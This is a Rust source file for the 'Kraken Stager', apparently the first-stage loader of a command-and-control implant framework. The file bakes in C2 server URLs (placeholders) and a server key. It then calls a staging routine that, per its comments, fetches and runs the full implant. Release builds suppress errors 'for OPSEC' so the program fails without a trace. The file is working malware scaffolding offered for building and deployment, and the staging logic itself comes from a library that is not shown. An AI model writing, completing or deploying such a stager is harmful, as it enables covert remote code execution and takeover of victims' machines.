//! Kraken Stager Binary
//!
//! Minimal executable that fetches and runs the full implant.
//! Configuration is baked at compile time via the `bake_config!` macro.

use implant_stager::{bake_config, stage, StagerConfig};

/// Baked configuration - replace with actual values at build time
static CONFIG: StagerConfig = bake_config!(
    c2_urls: [
        "https://c2.example.com",
        "https://backup.example.com",
    ],
    server_key: [
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
        0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
        0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
    ],
    profile: "default"
);

#[tokio::main(flavor = "current_thread")]
async fn main() {
    // Run stager - on success, this never returns (implant takes over)
    if let Err(_e) = stage(&CONFIG).await {
        // Silent failure - no output for OPSEC
        #[cfg(debug_assertions)]
        eprintln!("Stager failed: {}", _e);
    }
}
